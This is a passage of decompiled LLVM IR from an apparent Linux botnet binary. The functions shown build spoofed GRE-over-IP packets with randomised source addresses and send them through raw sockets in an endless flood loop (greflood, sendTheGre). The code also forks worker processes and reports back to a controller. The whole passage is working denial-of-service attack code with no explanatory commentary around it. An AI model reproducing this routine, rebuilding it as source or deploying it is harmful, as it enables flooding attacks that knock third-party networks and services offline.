dec_label_pc_804bd46:                             ; preds = %dec_label_pc_804bd19
  %v0_804bd46 = load i32, i32* %stack_var_-204, align 4
  %v1_804bd46 = call i32 @__errno_location(i32 %v0_804bd46)
  %v1_804bd4b = inttoptr i32 %v1_804bd46 to i32*
  %v2_804bd4b = load i32, i32* %v1_804bd4b, align 4
  %v9_804bd4d = icmp eq i32 %v2_804bd4b, 105
  %v1_804bd50 = icmp eq i1 %v9_804bd4d, false
  br i1 %v1_804bd50, label %dec_label_pc_804bd6d, label %dec_label_pc_804bd52

dec_label_pc_804bd52:                             ; preds = %dec_label_pc_804bd46
  %v6_804bd63 = call i32 @__libc_poll(%pollfd* %tmp49, i32 1, i32 1000)
  br label %dec_label_pc_804bcf8

dec_label_pc_804bd6d:                             ; preds = %dec_label_pc_804bd46
  %v3_804bd75 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80693b0.160, i32 0, i32 0))
  %v2_804bd83 = call i32 @close(i32 %v5_804bca0)
  %v3_804bd8b = load i32, i32* %stack_var_-96, align 4
  %v2_804bd92 = call i32 @freeaddrinfo(i32 %v3_804bd8b)
  br label %dec_label_pc_804bdd2

dec_label_pc_804bd9c:                             ; preds = %dec_label_pc_804bd19
  %v7_804bda0 = icmp sgt i32 %stack_var_-32.0.ph, 99
  br i1 %v7_804bda0, label %dec_label_pc_804bda2, label %dec_label_pc_804bdca

dec_label_pc_804bda2:                             ; preds = %dec_label_pc_804bd9c
  %v3_804bda7 = call i32 @__GI_time(i32* null)
  %v5_804bdb7 = icmp slt i32 %v3_804bda7, %v5_804bdb2
  br i1 %v5_804bdb7, label %dec_label_pc_804bdca, label %dec_label_pc_804bdb9

dec_label_pc_804bdb9:                             ; preds = %dec_label_pc_804bda2
  %v2_804bdbe = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804bdca

dec_label_pc_804bdca:                             ; preds = %dec_label_pc_804bdb9, %dec_label_pc_804bda2, %dec_label_pc_804bd9c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804bd9c ], [ 0, %dec_label_pc_804bda2 ], [ 0, %dec_label_pc_804bdb9 ]
  %v4_804bdca = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_804bcf8.outer

dec_label_pc_804bdd2:                             ; preds = %entry, %dec_label_pc_804bd6d
  %v0_804bdd9 = phi i32 [ %v1_804bbd3, %entry ], [ %v2_804bd92, %dec_label_pc_804bd6d ]
  ret i32 %v0_804bdd9

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.ph, { 1, 0 }
  uselistorder i32 %v5_804bca0, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v4_804bc0a, { 1, 0 }
  uselistorder i32 %v2_804bba4, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdd2, { 1, 0 }
  uselistorder label %dec_label_pc_804bd01, { 1, 0 }
  uselistorder label %dec_label_pc_804bcf8, { 1, 0 }
  uselistorder label %dec_label_pc_804bccb, { 1, 0 }
  uselistorder label %dec_label_pc_804bc97, { 1, 0 }
  uselistorder label %dec_label_pc_804bc30, { 1, 0 }
  uselistorder label %dec_label_pc_804bc0a, { 1, 0 }
}

define i32 @setup_gre_ip_header(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804bddd = load i32, i32* @edi, align 4
  %v0_804bdde = load i32, i32* @esi, align 4
  %v0_804bddf = load i32, i32* @ebx, align 4
  store i32 21, i32* @global_var_807e570.161, align 16
  store i8 69, i8* inttoptr (i32 1 to i8*), align 1
  store i8 0, i8* inttoptr (i32 2 to i8*), align 2
  %v2_804be34 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804be34, i32* @esi, align 4
  %v2_804be48 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804be48, i32* @edi, align 4
  %v2_804be5c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804be5c, i32* @ebx, align 4
  %v2_804be70 = call i32 @realrand(i32 1, i32 255)
  %v0_804be7b = load i32, i32* @esi, align 4
  %v0_804be7c = load i32, i32* @edi, align 4
  %v0_804be7d = load i32, i32* @ebx, align 4
  %v8_804be8b = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807e540.163 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v2_804be70, i32 %v0_804be7d, i32 %v0_804be7c, i32 %v0_804be7b)
  %v2_804be9d = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804be9d, i32* @esi, align 4
  %v2_804beb1 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804beb1, i32* @edi, align 4
  %v2_804bec5 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bec5, i32* @ebx, align 4
  %v2_804bed9 = call i32 @realrand(i32 1, i32 255)
  %v0_804bee4 = load i32, i32* @esi, align 4
  %v0_804bee5 = load i32, i32* @edi, align 4
  %v0_804bee6 = load i32, i32* @ebx, align 4
  %v8_804bef4 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807d3dc.164 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v2_804bed9, i32 %v0_804bee6, i32 %v0_804bee5, i32 %v0_804bee4)
  %v2_804bf06 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf06, i32* @esi, align 4
  %v2_804bf1a = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf1a, i32* @edi, align 4
  %v2_804bf2e = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf2e, i32* @ebx, align 4
  %v2_804bf42 = call i32 @realrand(i32 1, i32 255)
  %v0_804bf4d = load i32, i32* @esi, align 4
  %v0_804bf4e = load i32, i32* @edi, align 4
  %v0_804bf4f = load i32, i32* @ebx, align 4
  %v8_804bf5d = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807e524.165 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v2_804bf42, i32 %v0_804bf4f, i32 %v0_804bf4e, i32 %v0_804bf4d)
  %v2_804bf6f = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf6f, i32* @esi, align 4
  %v2_804bf83 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf83, i32* @edi, align 4
  %v2_804bf97 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804bf97, i32* @ebx, align 4
  %v2_804bfab = call i32 @realrand(i32 1, i32 255)
  %v0_804bfb6 = load i32, i32* @esi, align 4
  %v0_804bfb7 = load i32, i32* @edi, align 4
  %v0_804bfb8 = load i32, i32* @ebx, align 4
  %v8_804bfc6 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_807e558.166 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v2_804bfab, i32 %v0_804bfb8, i32 %v0_804bfb7, i32 %v0_804bfb6)
  %v1_804bfd3 = call i32 @htons(i32 73)
  %v2_804bfd3 = trunc i32 %v1_804bfd3 to i16
  store i16 %v2_804bfd3, i16* inttoptr (i32 3 to i16*), align 2
  %v1_804bfec = call i32 @htons(i32 65535)
  %v2_804bfec = trunc i32 %v1_804bfec to i16
  store i16 %v2_804bfec, i16* inttoptr (i32 5 to i16*), align 2
  store i8 64, i8* inttoptr (i32 9 to i8*), align 1
  %v1_804c00c = call i32 @htons(i32 16384)
  %v2_804c00c = trunc i32 %v1_804c00c to i16
  %sext5 = mul i32 %v1_804c00c, 65536
  %v1_804c014 = sdiv i32 %sext5, 65536
  store i32 %v1_804c014, i32* @edx, align 4
  store i16 %v2_804c00c, i16* inttoptr (i32 7 to i16*), align 2
  store i8 47, i8* inttoptr (i32 10 to i8*), align 2
  %v1_804c02c = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807e540.163 to i32))
  store i32 %v1_804c02c, i32* @edx, align 4
  store i32 %v1_804c02c, i32* inttoptr (i32 13 to i32*), align 4
  %v1_804c044 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807d3dc.164 to i32))
  store i32 %v1_804c044, i32* inttoptr (i32 17 to i32*), align 4
  %v0_804c054 = load i32, i32* @global_var_807e570.161, align 16
  store i32 %v0_804c054, i32* @ebx, align 4
  %v1_804c05f = call i32 @htons(i32 2)
  %v2_804c05f = trunc i32 %v1_804c05f to i16
  %v3_804c067 = load i32, i32* @ebx, align 4
  %v4_804c067 = add i32 %v3_804c067, 2
  %v5_804c067 = inttoptr i32 %v4_804c067 to i16*
  store i16 %v2_804c05f, i16* %v5_804c067, align 2
  store i8 69, i8* inttoptr (i32 25 to i8*), align 1
  store i8 0, i8* inttoptr (i32 26 to i8*), align 2
  %v1_804c094 = call i32 @htons(i32 540)
  %v2_804c094 = trunc i32 %v1_804c094 to i16
  store i16 %v2_804c094, i16* inttoptr (i32 27 to i16*), align 2
  %v1_804c0aa = call i32 @htons(i32 0)
  %v2_804c0aa = trunc i32 %v1_804c0aa to i16
  store i16 %v2_804c0aa, i16* inttoptr (i32 29 to i16*), align 2
  store i8 64, i8* inttoptr (i32 33 to i8*), align 1
  %v1_804c0ca = call i32 @htons(i32 16384)
  %v2_804c0ca = trunc i32 %v1_804c0ca to i16
  %sext9 = mul i32 %v1_804c0ca, 65536
  %v1_804c0d2 = sdiv i32 %sext9, 65536
  store i32 %v1_804c0d2, i32* @edx, align 4
  store i16 %v2_804c0ca, i16* inttoptr (i32 31 to i16*), align 2
  store i8 17, i8* inttoptr (i32 34 to i8*), align 2
  %v1_804c0ea = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807e524.165 to i32))
  store i32 %v1_804c0ea, i32* @edx, align 4
  store i32 %v1_804c0ea, i32* inttoptr (i32 37 to i32*), align 4
  %v1_804c102 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_807e558.166 to i32))
  store i32 %v1_804c102, i32* inttoptr (i32 41 to i32*), align 4
  store i32 %v0_804bddf, i32* @ebx, align 4
  store i32 %v0_804bdde, i32* @esi, align 4
  store i32 %v0_804bddd, i32* @edi, align 4
  ret i32 25

; uselistorder directives
  uselistorder i32 %v1_804c0ea, { 1, 0 }
  uselistorder i32 %v1_804c02c, { 1, 0 }
}

define i32 @setup_gre_header(i16* %arg1) local_unnamed_addr {
entry:
  %v2_804c12a = call i32 @realrand(i32 1, i32 99999)
  %v1_804c132 = urem i32 %v2_804c12a, 65536
  %v1_804c13b = call i32 @htons(i32 %v1_804c132)
  %v2_804c13b = trunc i32 %v1_804c13b to i16
  %v4_804c145 = ptrtoint i16* %arg1 to i32
  store i16 %v2_804c13b, i16* %arg1, align 2
  %v2_804c155 = call i32 @realrand(i32 1, i32 255)
  %v1_804c15d = urem i32 %v2_804c155, 65536
  %v1_804c166 = call i32 @htons(i32 %v1_804c15d)
  %v2_804c166 = trunc i32 %v1_804c166 to i16
  %v3_804c173 = add i32 %v4_804c145, 2
  %v4_804c173 = inttoptr i32 %v3_804c173 to i16*
  store i16 %v2_804c166, i16* %v4_804c173, align 2
  %v1_804c17a = add i32 %v4_804c145, 6
  %v2_804c17a = inttoptr i32 %v1_804c17a to i16*
  store i16 0, i16* %v2_804c17a, align 2
  %v1_804c183 = add i32 %v4_804c145, 8
  %v1_804c18c = inttoptr i32 %v1_804c183 to i32*
  store i32 -1, i32* %v1_804c18c, align 4
  %v1_804c195 = add i32 %v4_804c145, 12
  %v1_804c198 = inttoptr i32 %v1_804c195 to i16*
  store i16 11, i16* %v1_804c198, align 2
  %v1_804c1a5 = call i32 @htons(i32 520)
  %v2_804c1a5 = trunc i32 %v1_804c1a5 to i16
  %v4_804c1b2 = add i32 %v4_804c145, 4
  %v5_804c1b2 = inttoptr i32 %v4_804c1b2 to i16*
  store i16 %v2_804c1a5, i16* %v5_804c1b2, align 2
  ret i32 %v4_804c145

; uselistorder directives
  uselistorder i32 %v4_804c145, { 0, 1, 3, 2, 4, 5 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @greflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %v2_804c1c8 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804c1d4 = add i32 %v2_804c1c8, 20
  %v1_804c1dd = add i32 %arg1, 8
  %v2_804c1dd = inttoptr i32 %v1_804c1dd to i32*
  %v3_804c1dd = load i32, i32* %v2_804c1dd, align 4
  store i32 %v3_804c1dd, i32* %stack_var_-4144, align 4
  %v1_804c1e6 = add i32 %arg1, 12
  %v2_804c1e6 = inttoptr i32 %v1_804c1e6 to i32*
  %v3_804c1e6 = load i32, i32* %v2_804c1e6, align 4
  %v3_804c20a = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804c215 = icmp slt i32 %v3_804c20a, 0
  %v1_804c219 = icmp eq i1 %v5_804c215, false
  br i1 %v1_804c219, label %entry.dec_label_pc_804c225_crit_edge, label %dec_label_pc_804c21b

entry.dec_label_pc_804c225_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804c225

dec_label_pc_804c21b:                             ; preds = %entry
  %v1_804c220 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c225

dec_label_pc_804c225:                             ; preds = %entry.dec_label_pc_804c225_crit_edge, %dec_label_pc_804c21b
  %v3_804c242 = bitcast i32* %stack_var_-4128 to i8*
  %v4_804c242 = call i32 @__GI_memset(i8* %v3_804c242, i32 0, i32 4096)
  %v1_804c250 = call i32 @setup_gre_ip_header(i32 %v2_804c1c8)
  %v1_804c25e = inttoptr i32 %v1_804c1d4 to i16*
  %v2_804c25e = call i32 @setup_gre_header(i16* %v1_804c25e)
  %v2_804c26f = add i32 %v2_804c1c8, 16
  %v3_804c26f = inttoptr i32 %v2_804c26f to i32*
  store i32 %v3_804c1e6, i32* %v3_804c26f, align 4
  %v1_804c275 = or i32 %v2_804c1c8, 2
  %v2_804c275 = inttoptr i32 %v1_804c275 to i16*
  %v3_804c275 = load i16, i16* %v2_804c275, align 2
  %v4_804c275 = zext i16 %v3_804c275 to i32
  %v2_804c286 = bitcast i32* %stack_var_-4128 to i16*
  %v3_804c286 = call i32 @csum(i16* %v2_804c286, i32 %v4_804c275)
  %v4_804c286 = trunc i32 %v3_804c286 to i16
  %v3_804c293 = add i32 %v2_804c1c8, 10
  %v4_804c293 = inttoptr i32 %v3_804c293 to i16*
  store i16 %v4_804c286, i16* %v4_804c293, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804c2a1 = ptrtoint i32* %stack_var_-4148 to i32
  store i32 %v3_804c20a, i32* %stack_var_-4188, align 4
  %v5_804c2b9 = call i32 @__GI_setsockopt(i32 %v3_804c20a, i32 0, i32 3, i32 %v2_804c2a1, i32 4)
  %v2_804c2c1 = icmp slt i32 %v5_804c2b9, 0
  %v1_804c2c3 = icmp eq i1 %v2_804c2c1, false
  br i1 %v1_804c2c3, label %dec_label_pc_804c2cf, label %dec_label_pc_804c2c5

dec_label_pc_804c2c5:                             ; preds = %dec_label_pc_804c225
  %v1_804c2ca = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c2cf

dec_label_pc_804c2cf:                             ; preds = %dec_label_pc_804c225, %dec_label_pc_804c2c5
  %v2_804c2d4 = call i32 @__GI_time(i32* null)
  %v1_804c2dd = call i32 @init_rand(i32 %v2_804c2d4)
  %v2_804c2ef = ptrtoint i32* %stack_var_-4144 to i32
  %v2_804c363 = add i32 %v2_804c1c8, 12
  %v3_804c363 = inttoptr i32 %v2_804c363 to i32*
  %v3_804c37c = add i32 %v2_804c1c8, 4
  %v4_804c37c = inttoptr i32 %v3_804c37c to i16*
  br label %dec_label_pc_804c2ef

dec_label_pc_804c2ef:                             ; preds = %dec_label_pc_804c3d8, %dec_label_pc_804c2cf
  %storemerge = phi i32 [ %v4_804c3d8, %dec_label_pc_804c3d8 ], [ 0, %dec_label_pc_804c2cf ]
  store i32 %storemerge, i32* %stack_var_-4156, align 4
  %v3_804c2f8 = load i16, i16* %v2_804c275, align 2
  %v4_804c2f8 = zext i16 %v3_804c2f8 to i32
  store i32 %v3_804c20a, i32* %stack_var_-4188, align 4
  %v6_804c314 = call i32 @sendto(i32 %v3_804c20a, i32 %v2_804c1c8, i32 %v4_804c2f8, i32 0, i32 %v2_804c2ef, i32 16)
  %v1_804c31c = call i32 @rand_cmwc(i32 %v3_804c20a)
  %v2_804c321 = urem i32 %v1_804c31c, 16777216
  %v2_804c32b = sub i32 %v1_804c31c, %v2_804c321
  store i32 %v2_804c32b, i32* @ebx, align 4
  %v1_804c32e = call i32 @rand_cmwc(i32 %v3_804c20a)
  %sext = mul i32 %v1_804c32e, 65536
  %v1_804c333 = sdiv i32 %sext, 65536
  %v1_804c336 = and i32 %v1_804c333, 16711680
  %v0_804c33e = load i32, i32* @ebx, align 4
  %v2_804c33e = or i32 %v1_804c336, %v0_804c33e
  store i32 %v2_804c33e, i32* @ebx, align 4
  %v0_804c340 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c340 = call i32 @rand_cmwc(i32 %v0_804c340)
  %sext1 = mul i32 %v1_804c340, 16777216
  %v1_804c345 = sdiv i32 %sext1, 16777216
  %v1_804c348 = and i32 %v1_804c345, 65280
  %v0_804c350 = load i32, i32* @ebx, align 4
  %v2_804c350 = or i32 %v1_804c348, %v0_804c350
  store i32 %v2_804c350, i32* @ebx, align 4
  %v0_804c352 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c352 = call i32 @rand_cmwc(i32 %v0_804c352)
  %v1_804c357 = urem i32 %v1_804c352, 256
  %v0_804c35c = load i32, i32* @ebx, align 4
  %v2_804c35e = or i32 %v0_804c35c, %v1_804c357
  store i32 %v2_804c35e, i32* %v3_804c363, align 4
  %v0_804c366 = load i32, i32* %stack_var_-4188, align 4
  %v1_804c366 = call i32 @rand_cmwc(i32 %v0_804c366)
  %v1_804c36f = call i32 @htonl(i32 %v1_804c366)
  %v2_804c36f = trunc i32 %v1_804c36f to i16
  store i16 %v2_804c36f, i16* %v4_804c37c, align 4
  %v3_804c383 = load i16, i16* %v2_804c275, align 2
  %v4_804c383 = zext i16 %v3_804c383 to i32
  %v3_804c394 = call i32 @csum(i16* %v2_804c286, i32 %v4_804c383)
  %v4_804c394 = trunc i32 %v3_804c394 to i16
  store i16 %v4_804c394, i16* %v4_804c293, align 2
  %v0_804c3a5 = load i64, i64* @global_var_807d500.88, align 8
  %v1_804c3a5 = trunc i64 %v0_804c3a5 to i32
  %v1_804c3aa = add i32 %v1_804c3a5, 1
  %v1_804c3ab = sext i32 %v1_804c3aa to i64
  store i64 %v1_804c3ab, i64* @global_var_807d500.88, align 256
  %v0_804c3b0 = load i32, i32* @global_var_807d3c8.89, align 8
  %v4_804c3b5 = load i32, i32* %stack_var_-4156, align 4
  %v6_804c3bb = icmp ugt i32 %v0_804c3b0, %v4_804c3b5
  br i1 %v6_804c3bb, label %dec_label_pc_804c2ef.dec_label_pc_804c3d8_crit_edge, label %dec_label_pc_804c3bd

dec_label_pc_804c2ef.dec_label_pc_804c3d8_crit_edge: ; preds = %dec_label_pc_804c2ef
  br label %dec_label_pc_804c3d8

dec_label_pc_804c3bd:                             ; preds = %dec_label_pc_804c2ef
  store i32 0, i32* %stack_var_-4156, align 4
  %v0_804c3c7 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804c3d0 = sext i32 %v0_804c3c7 to i64
  %v2_804c3d0 = call i32 @usleep(i64 %v1_804c3d0)
  br label %dec_label_pc_804c3d8

dec_label_pc_804c3d8:                             ; preds = %dec_label_pc_804c2ef.dec_label_pc_804c3d8_crit_edge, %dec_label_pc_804c3bd
  %v3_804c3d8 = phi i32 [ %v4_804c3b5, %dec_label_pc_804c2ef.dec_label_pc_804c3d8_crit_edge ], [ 0, %dec_label_pc_804c3bd ]
  %v4_804c3d8 = add i32 %v3_804c3d8, 1
  br label %dec_label_pc_804c2ef

; uselistorder directives
  uselistorder i32 %v3_804c20a, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804c1c8, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %stack_var_-4156, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32* %stack_var_-4188, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_804c2cf, { 1, 0 }
  uselistorder label %dec_label_pc_804c225, { 1, 0 }
}

define i32 @sendTheGre(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c3e3 = load i32, i32* @ebp, align 4
  store i32 %v0_804c3e3, i32* %stack_var_-4, align 4
  %v4_804c3e3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804c3e3, i32* @ebp, align 4
  %v15_804c3e6 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v15_804c3e6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-108, align 4
  %v3_804c3f1 = ptrtoint i32* %stack_var_-108 to i32
  %v2_804c3f3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804c3f3, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-108, align 4
  %v1_804c404 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804c404, i32* %eax.global-to-local, align 4
  %v1_804c40c = icmp eq i32 %v1_804c404, 0
  %v1_804c40e = icmp eq i1 %v1_804c40c, false
  br i1 %v1_804c40e, label %dec_label_pc_804c741, label %dec_label_pc_804c414

dec_label_pc_804c414:                             ; preds = %entry
  store i32 2, i32* %stack_var_-108, align 4
  %v3_804c420 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804c420, i32* %eax.global-to-local, align 4
  %v5_804c42b = icmp slt i32 %v3_804c420, 0
  %v1_804c42f = icmp eq i1 %v5_804c42b, false
  br i1 %v1_804c42f, label %dec_label_pc_804c43b, label %dec_label_pc_804c431

dec_label_pc_804c431:                             ; preds = %dec_label_pc_804c414
  store i32 1, i32* %stack_var_-108, align 4
  %v1_804c436 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804c436, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c43b

dec_label_pc_804c43b:                             ; preds = %dec_label_pc_804c414, %dec_label_pc_804c431
  %v4_804c43b = add i32 %arg3, -4
  %v9_804c43b = sub i32 3, %arg3
  %v10_804c43b = and i32 %v9_804c43b, %arg3
  %v11_804c43b = icmp slt i32 %v10_804c43b, 0
  %v12_804c43b = icmp eq i32 %v4_804c43b, 0
  %v13_804c43b = icmp slt i32 %v4_804c43b, 0
  %v3_804c43f = icmp eq i1 %v13_804c43b, %v11_804c43b
  %v4_804c43f = icmp eq i1 %v12_804c43b, false
  %v5_804c43f = and i1 %v4_804c43f, %v3_804c43f
  br i1 %v5_804c43f, label %dec_label_pc_804c43b.dec_label_pc_804c461_crit_edge, label %dec_label_pc_804c441

dec_label_pc_804c43b.dec_label_pc_804c461_crit_edge: ; preds = %dec_label_pc_804c43b
  br label %dec_label_pc_804c461

dec_label_pc_804c441:                             ; preds = %dec_label_pc_804c43b
  %v3_804c44f = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_80693c4.167 to i32))
  store i32 %v3_804c44f, i32* %eax.global-to-local, align 4
  %v1_804c45c = call i32 @__GI_exit(i32 -1)
  store i32 %v1_804c45c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c461

dec_label_pc_804c461:                             ; preds = %dec_label_pc_804c43b.dec_label_pc_804c461_crit_edge, %dec_label_pc_804c441
  %v1_804c464 = add i32 %arg4, 12
  store i32 %v1_804c464, i32* %eax.global-to-local, align 4
  %v1_804c467 = inttoptr i32 %v1_804c464 to i32*
  %v2_804c467 = load i32, i32* %v1_804c467, align 4
  store i32 %v2_804c467, i32* %eax.global-to-local, align 4
  %v1_804c46d = call i32 @atol(i32 %v2_804c467)
  %v1_804c47b = add i32 %arg4, 16
  store i32 %v1_804c47b, i32* %eax.global-to-local, align 4
  %v1_804c47e = inttoptr i32 %v1_804c47b to i32*
  %v2_804c47e = load i32, i32* %v1_804c47e, align 4
  store i32 %v2_804c47e, i32* %eax.global-to-local, align 4
  %v1_804c484 = call i32 @atol(i32 %v2_804c47e)
  %v1_804c492 = add i32 %arg4, 8
  store i32 %v1_804c492, i32* %eax.global-to-local, align 4
  %v1_804c495 = inttoptr i32 %v1_804c492 to i32*
  %v2_804c495 = load i32, i32* %v1_804c495, align 4
  store i32 %v2_804c495, i32* %eax.global-to-local, align 4
  %v1_804c49b = call i32 @atol(i32 %v2_804c495)
  %v1_804c4a9 = add i32 %arg4, 20
  store i32 %v1_804c4a9, i32* %eax.global-to-local, align 4
  %v1_804c4ac = inttoptr i32 %v1_804c4a9 to i32*
  %v2_804c4ac = load i32, i32* %v1_804c4ac, align 4
  store i32 %v2_804c4ac, i32* %eax.global-to-local, align 4
  %v1_804c4b2 = call i32 @atol(i32 %v2_804c4ac)
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v2_804c4d4 = mul i32 %v1_804c46d, 4
  %v1_804c4da = add i32 %v2_804c4d4, 30
  %v2_804c4dd = and i32 %v1_804c4da, -16
  %v2_804c4e3 = sub i32 %v3_804c3f1, %v2_804c4dd
  %v1_804c4eb = add i32 %v2_804c4e3, 15
  %v2_804c4ee = and i32 %v1_804c4eb, -16
  %v1_804c506 = urem i32 %v1_804c49b, 65536
  store i32 %v1_804c506, i32* %eax.global-to-local, align 4
  %v2_804c50e = add i32 %v2_804c4e3, -16
  %v3_804c50e = inttoptr i32 %v2_804c50e to i32*
  store i32 %v1_804c506, i32* %v3_804c50e, align 4
  %v1_804c50f = call i32 @htons(i32 %v2_804c4ee)
  %v0_804c514 = load i32, i32* @esp, align 4
  %v1_804c51e = add i32 %arg4, 4
  store i32 %v1_804c51e, i32* %eax.global-to-local, align 4
  %v1_804c521 = inttoptr i32 %v1_804c51e to i32*
  %v2_804c521 = load i32, i32* %v1_804c521, align 4
  store i32 %v2_804c521, i32* %eax.global-to-local, align 4
  %v3_804c526 = inttoptr i32 %v0_804c514 to i32*
  store i32 %v2_804c521, i32* %v3_804c526, align 4
  %sext = mul i32 %v1_804c50f, 65536
  %v1_804c527 = sdiv i32 %sext, 65536
  %v2_804c527 = call i32 @inet_addr(i32 %v1_804c527)
  %v0_804c52c = load i32, i32* @esp, align 4
  %v1_804c52c = add i32 %v0_804c52c, 16
  store i32 %v1_804c46d, i32* %edx.global-to-local, align 4
  %v2_804c53d = mul i32 %v1_804c46d, 24
  %v1_804c543 = add i32 %v2_804c53d, 30
  %v2_804c546 = and i32 %v1_804c543, -16
  %v2_804c54c = sub i32 %v1_804c52c, %v2_804c546
  %v1_804c554 = add i32 %v2_804c54c, 15
  %v2_804c557 = and i32 %v1_804c554, -16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804c61153 = icmp sgt i32 %v1_804c46d, 0
  br i1 %v5_804c61153, label %dec_label_pc_804c579.lr.ph, label %dec_label_pc_804c617

dec_label_pc_804c579.lr.ph:                       ; preds = %dec_label_pc_804c461
  %v3_804c5a8 = or i32 %v2_804c557, 8
  br label %dec_label_pc_804c579

dec_label_pc_804c579:                             ; preds = %dec_label_pc_804c579, %dec_label_pc_804c579.lr.ph
  %storemerge54 = phi i32 [ 0, %dec_label_pc_804c579.lr.ph ], [ %v4_804c608, %dec_label_pc_804c579 ]
  %v1_804c585 = mul i32 %storemerge54, 24
  %v3_804c58f = add i32 %v1_804c585, %v2_804c557
  %v4_804c58f = inttoptr i32 %v3_804c58f to i32*
  store i32 %storemerge54, i32* %v4_804c58f, align 8
  store i32 %v2_804c557, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c585, i32* %edx.global-to-local, align 4
  %v4_804c5a8 = add i32 %v3_804c5a8, %v1_804c585
  %v5_804c5a8 = inttoptr i32 %v4_804c5a8 to i32*
  store i32 2, i32* %v5_804c5a8, align 8
  %v1_804c5af = load i32, i32* %edx.global-to-local, align 4
  %v2_804c5af = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c5af = add i32 %v1_804c5af, 12
  %v4_804c5af = add i32 %v3_804c5af, %v2_804c5af
  %v5_804c5af = inttoptr i32 %v4_804c5af to i32*
  store i32 %v2_804c527, i32* %v5_804c5af, align 4
  %v1_804c5b6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c5b6 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c5b6 = add i32 %v1_804c5b6, 16
  %v4_804c5b6 = add i32 %v3_804c5b6, %v2_804c5b6
  %v5_804c5b6 = inttoptr i32 %v4_804c5b6 to i32*
  %v1_804c5bd = load i32, i32* %edx.global-to-local, align 4
  %v2_804c5bd = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c5bd = add i32 %v1_804c5bd, 20
  %v4_804c5bd = add i32 %v3_804c5bd, %v2_804c5bd
  %v5_804c5bd = inttoptr i32 %v4_804c5bd to i32*
